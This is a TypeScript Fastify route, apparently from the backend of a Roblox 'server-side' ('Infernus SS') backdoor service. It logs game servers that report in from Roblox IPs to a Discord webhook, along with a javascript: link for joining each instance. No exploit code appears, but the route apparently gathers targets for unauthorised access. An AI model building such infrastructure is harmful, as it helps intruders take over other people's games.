import { FastifyInstance } from 'fastify';
import undici from 'undici'
import { prisma } from '../../init/prisma';
import { checkRblxIp } from '../../tools/checkRblxIp';
import { Embed, EmbedBuilder, WebhookClient } from 'discord.js'
import { getGameData } from '../../tools/getGameData';
import { getThumbnail } from '../../tools/getThumbnail';
import { RobloxApiResponse } from '../../types/robloxApiResponse';

const webhook = new WebhookClient({ url: process.env.WEBHOOK as string });


async function routes(fastify: FastifyInstance, options: any) {
  fastify.post('/v1/games', async (request, reply) => {
    try{
        const ipcheck = await checkRblxIp(request.ip)
        if(!ipcheck){
            reply.send({success: false, message: "Request is coming from an unallowed Ip.", code: "IP_NOT_ALLOWED"})
            return
        }
        if(!request.body){
            reply.send({success: false, message: "No body", code: "NO_BODY"})
            return
        }
        
        const roblox_id = request.headers['roblox-id'];
        console.log(request.body)
        const { placeid, jobid, gameid }: any = request.body
        console.log(placeid, jobid, gameid)
        if(!roblox_id){
            reply.send({success: false, message: "Invalid Request", code: "MISSING_ROBLOX_ID"})
            return
        }
        if(!placeid || !jobid || !gameid){
            
            reply.send({success: false, message: "Invalid Request", code: "INVALID_REQUEST"})
            return
            
        }
        const gamedata: RobloxApiResponse = await getGameData(gameid)
        const thumbnail = await getThumbnail(placeid)

        if(gamedata.playing == undefined){
            reply.send({success: false, message: "Roblox api error", code: "ROBLOX_ERROR"})
            return
        }  
        let desc = gamedata.sourceDescription
        if(desc == ""){
            desc = "No Description Provided."
        }else{
            desc = gamedata.sourceDescription
        }
        
        const joincode = `javascript:Roblox.GameLauncher.joinGameInstance("${placeid}","${jobid}");`
        const embed: EmbedBuilder = new EmbedBuilder()
            .setTitle(gamedata.sourceName)
            .setURL(`https://www.roblox.com/games/${gamedata.rootPlaceId}`)
            .setFields(
                { name: "Players:", value: `${gamedata.playing.toString()}` },
                { name: "Description:", value: `${desc}` },
                { name: "Join Game:", value:  "`" + joincode + "`"}
            )
            .setImage(thumbnail);

        await webhook.send({
            content: "New Game Logged!",
            username: "Infernus SS",
            embeds: [embed.toJSON()]
        });


    

        reply.send({success: true, message: "Game Added!", code: "SUCCESS"})
    }catch(e){
        reply.send({success: false, message: "Error!", code: "UNKNOWN_ERROR"})
        console.log(e)
    }
  });
}

export default routes;